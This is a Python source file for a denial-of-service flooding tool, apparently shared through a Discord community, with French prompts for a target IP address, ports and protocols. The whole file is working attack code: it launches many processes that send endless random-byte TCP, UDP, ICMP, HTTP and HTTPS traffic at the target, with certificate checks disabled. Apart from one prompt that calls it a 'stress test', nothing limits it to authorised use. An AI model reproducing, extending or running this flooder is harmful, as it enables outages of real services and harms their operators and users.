import random
import asyncio
import multiprocessing
import os
import platform
import psutil
import selectors
import socket
import ssl
from aiohttp import ClientSession
from pystyle import Center, Colorate, Colors, Anime
from colorama import Fore
import os


SOCK_BUFFER_SIZE = 1024 * 1024 
MAX_UDP_PACKET_SIZE = 65507
MAX_TCP_PACKET_SIZE = 1024 * 1024  
MAX_HTTP_PACKET_SIZE = 1024  

def randomize_cpu_affinity():
    current_pid = os.getpid()
    try:
        cpu_count = os.cpu_count()
        if not cpu_count:
            print("[WARNING] Unable to determine the number of CPUs.")
            return

        cpu_ids = random.sample(range(cpu_count), random.randint(1, cpu_count))
        if platform.system() in ['Linux', 'Android']:
            cpu_mask = sum(1 << cpu for cpu in cpu_ids)
            os.system(f'taskset -p {cpu_mask} {current_pid}')
            print(f"[INFO] Set CPU affinity mask to: {cpu_mask}")
        elif platform.system() == 'Windows':
            psutil.Process(current_pid).cpu_affinity(cpu_ids)
            print(f"[INFO] Set CPU affinity to: {cpu_ids}")
        else:
            print(f"[WARNING] CPU affinity setting not supported on this platform: {platform.system()}")
    except psutil.AccessDenied:
        print("[ERROR] Access denied to set CPU affinity. Run with elevated permissions.")
    except Exception as e:
        print(f"[ERROR] Exception occurred while setting CPU affinity: {e}")

async def send_tcp_packet(target, port, selector, packet_size=MAX_TCP_PACKET_SIZE):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
        sock.setblocking(False)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            sock.connect((target, port))
        except BlockingIOError:
            pass  

        selector.register(sock, selectors.EVENT_WRITE)
        data = random._urandom(packet_size)

        while True:
            events = selector.select(timeout=0.01)
            for key, _ in events:
                try:
                    sock.send(data)
                except (ConnectionRefusedError, OSError) as e:
                    print(f"[ERROR] TCP connection error: {e}")
                    return 
    except Exception as e:
        print(f"[ERROR] Exception in TCP sending: {e}")
    finally:
        try:
            selector.unregister(sock)
            sock.close()
        except Exception as e:
            print(f"[ERROR] Exception closing TCP socket: {e}")

async def send_udp_packet(target, port, packet_size=MAX_UDP_PACKET_SIZE):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
        sock.setblocking(False)
        data = random._urandom(packet_size)

        while True:
            try:
                sock.sendto(data, (target, port))
                await asyncio.sleep(0.0001) 
            except OSError as e:
                print(f"[ERROR] UDP socket error: {e}")
                break
    except Exception as e:
        print(f"[ERROR] Exception in UDP sending: {e}")
    finally:
        try:
            sock.close()
        except Exception as e:
            print(f"[ERROR] Exception closing UDP socket: {e}")

async def send_icmp_packet(target):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00'  
            while True:
                sock.sendto(packet, (target, 0))
                await asyncio.sleep(0.01) 
    except Exception as e:
        print(f"[ERROR] Exception in ICMP sending: {e}")

async def send_https_request(target, port, packet_size=MAX_HTTP_PACKET_SIZE):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    url = f"https://{target}:{port}"
    async with ClientSession() as session:
        data = random._urandom(packet_size)
        while True:
            try:
                async with session.post(url, data=data, ssl=ssl_context) as response:
                    await response.read()
            except Exception as e:
                print(f"[ERROR] HTTPS request error: {e}")
                await asyncio.sleep(0.01)

async def send_http_request(target, port, packet_size=MAX_HTTP_PACKET_SIZE):
    url = f"http://{target}:{port}"
    async with ClientSession() as session:
        data = random._urandom(packet_size)
        while True:
            try:
                async with session.post(url, data=data) as response:
                    await response.read()
            except Exception as e:
                print(f"[ERROR] HTTP request error: {e}")
                await asyncio.sleep(0.01)

def parse_ports(port_input):
    try:
        if '-' in port_input:
            start, end = map(int, port_input.split('-'))
            return list(range(start, end + 1))
        elif ',' in port_input:
            return list(map(int, port_input.split(',')))
        else:
            return [int(port_input)]
    except ValueError as e:
        print(f"[ERROR] Exception parsing ports: {e}")
        return []

def run_ip_info(ip_address, port, num_processes, num_threads_per_process, protocol, packet_size):
    randomize_cpu_affinity()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    tasks = []
    if protocol == 'TCP':
        tasks = [send_tcp_packet(ip_address, port, selectors.DefaultSelector(), packet_size) for _ in range(num_threads_per_process)]
    elif protocol == 'UDP':
        tasks = [send_udp_packet(ip_address, port, packet_size) for _ in range(num_threads_per_process)]
    elif protocol == 'ICMP':
        tasks = [send_icmp_packet(ip_address)]
    elif protocol == 'HTTPS':
        tasks = [send_https_request(ip_address, port, packet_size)]
    elif protocol == 'HTTP':
        tasks = [send_http_request(ip_address, port, packet_size)]

    try:
        loop.run_until_complete(asyncio.gather(*tasks))
    except Exception as e:
        print(f"[ERROR] Exception during async tasks: {e}")
    finally:
        loop.close()

def main():
    os.system('cls')
    print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))
    ip_address = input(Fore.BLUE + "Entrez l'adresse IP cible : " + Fore.WHITE).strip()
    port_input = input(Fore.BLUE + "Entrez le(s) port(s) cible(s) (ex: 80, 443 ou 1000-2000) : " + Fore.WHITE).strip()
    use_tcp = input(Fore.BLUE + "Utiliser le protocole TCP ? (y/n) : " + Fore.WHITE).strip().lower() == 'y'
    use_udp = input(Fore.BLUE + "Utiliser le protocole UDP ? (y/n) : " + Fore.WHITE).strip().lower() == 'y'
    use_icmp = input(Fore.BLUE + "Utiliser le protocole ICMP ? (y/n) : " + Fore.WHITE).strip().lower() == 'y'
    use_http = input(Fore.BLUE + "Utiliser le protocole HTTP ? (y/n) : " + Fore.WHITE).strip().lower() == 'y'
    use_https = input(Fore.BLUE + "Utiliser le protocole HTTPS ? (y/n) : ").strip().lower() == 'y'
    run_all = input(Fore.BLUE + "Exécuter tous les protocoles en parallèle ? (y/n) : ").strip().lower() == 'y'
    num_processes = int(input(Fore.BLUE + "Nombre de processus à exécuter en parallèle (par défaut : 30) : ") or 30)
    num_threads_per_process = int(input(Fore.BLUE + "Nombre de threads par processus (par défaut : 40) : ") or 40)
    packet_size = int(input(Fore.BLUE + f"Taille des paquets pour le test de stress (par défaut : {MAX_UDP_PACKET_SIZE}) : ") or MAX_UDP_PACKET_SIZE)

    protocols = []
    ports = {}

    if run_all:
        port_list = parse_ports(port_input)
        protocols = ['TCP', 'UDP', 'ICMP', 'HTTPS', 'HTTP']
        for protocol in protocols:
            ports[protocol] = port_list if protocol != 'ICMP' else [0]
    else:
        if use_tcp: protocols.append('TCP')
        if use_udp: protocols.append('UDP')
        if use_icmp: protocols.append('ICMP')
        if use_http: protocols.append('HTTP')
        if use_https: protocols.append('HTTPS')

        port_list = parse_ports(port_input)
        for protocol in protocols:
            ports[protocol] = port_list if protocol != 'ICMP' else [0]

    for protocol in protocols:
        for port in ports.get(protocol, []):
            processes = []
            for _ in range(num_processes):
                process = multiprocessing.Process(
                    target=run_ip_info,
                    args=(ip_address, port, num_processes, num_threads_per_process, protocol, packet_size)
                )
                process.start()
                processes.append(process)
            for process in processes:
                process.join()

if __name__ == "__main__":
    main()